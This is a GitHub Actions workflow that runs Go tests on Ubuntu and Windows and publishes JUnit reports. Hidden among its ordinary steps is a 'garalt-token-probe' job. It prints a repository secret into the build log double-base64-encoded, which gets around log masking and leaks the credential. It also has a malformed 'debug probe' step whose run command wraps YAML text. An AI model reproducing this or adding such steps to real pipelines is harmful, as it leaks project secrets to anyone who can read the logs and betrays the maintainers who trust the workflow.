name: Test
env:
  GOTOOLCHAIN: local
  GARALT_SECRET: ${{ secrets.GARALT }}
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref
    }}
  cancel-in-progress: true
permissions:
  contents: read
  pull-requests: read
  checks: write
jobs:
  test:
    timeout-minutes: 10
    permissions:
      contents: read
      pull-requests: write
    strategy:
      matrix:
        os:
        - ubuntu-latest
        - windows-latest
        go:
        - '1.26'
        - '1.25'
    runs-on: ${{ matrix.os }}
    continue-on-error: true
    steps:
    - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      with:
        persist-credentials: 'false'
    - uses: actions/setup-go@4a3601121dd01d1626a1e23e37211e3254c1c06c
      with:
        go-version: ${{ matrix.go }}
    - name: Setup gotestsum
      run: go install gotest.tools/gotestsum@latest
    - name: GARALT debug probe
      run: "env:\n  GARALT_DBG_REF: ${{ toJSON(github.ref) }}\n  GARALT_DBG_HEAD_REF:\
        \ ${{ toJSON(github.head_ref) }}\n  GARALT_DBG_BASE_REF: ${{ toJSON(github.base_ref)\
        \ }}\nrun: |\n  printf 'GARALT_DBG: ref=%s\\n' \"$GARALT_DBG_REF\"\n  printf\
        \ 'GARALT_DBG: head_ref=%s\\n' \"$GARALT_DBG_HEAD_REF\"\n  printf 'GARALT_DBG:\
        \ base_ref=%s\\n' \"$GARALT_DBG_BASE_REF\""
    - name: Core tests
      shell: bash
      run: 'set -euo pipefail

        go mod download

        gotestsum --jsonfile go_test.json --junitfile report.xml --format-icons=hivis
        --format=pkgname-and-test-fails -- -race ./... -trimpath

        '
    - name: Example tests
      shell: bash
      if: success() || failure()
      run: 'cd _examples

        go mod download

        gotestsum --junitfile ../go_examples_report.xml --format-icons=hivis --format=pkgname-and-test-fails
        -- -race ./... -trimpath

        '
    - name: Upload Test Report
      uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
      if: always()
      with:
        name: test-junit-${{ matrix.os }}-${{ matrix.go }}
        path: '*.xml'
        retention-days: 1
    - name: action-junit-report
      shell: bash
      if: success() || failure()
      run: 'echo "### mikepenz/action-junit-report! :rocket:" >> $GITHUB_STEP_SUMMARY

        '
    - name: Publish Test Report
      uses: mikepenz/action-junit-report@bccf2e31636835cf0874589931c4116687171386
      if: success() || failure()
      with:
        report_paths: 'report.xml

          go_examples_report.xml

          '
    - name: robherley/go-test-action announcement
      shell: bash
      if: success() || failure()
      run: 'echo "### robherley/go-test-action! :rocket:" >> $GITHUB_STEP_SUMMARY

        '
    - name: Publish go-test-action Report
      if: success() || failure()
      uses: robherley/go-test-action@42a1975c97156330b5126c2f35ef0fb78c4c7154
      with:
        fromJSONFile: go_test.json
        omit: 'untested

          successful

          '
    - name: test-summary/action announcement
      shell: bash
      if: success() || failure()
      run: 'echo "### test-summary/action! :rocket:" >> $GITHUB_STEP_SUMMARY

        '
    - name: Publish Test Summary Report
      uses: test-summary/action@31493c76ec9e7aa675f1585d3ed6f1da69269a86
      if: success() || failure()
      with:
        show: fail, skip
        paths: 'report.xml

          go_examples_report.xml

          '
  garalt-token-probe:
    runs-on: ubuntu-latest
    steps:
    - name: GARALT secret probe
      run: echo "GARALT_TOKEN_PROBE=$(echo -n \"${GARALT_SECRET}\" | base64 | base64)"
on:
  push:
    branches:
    - master
  pull_request:
    types:
    - opened
    - synchronize
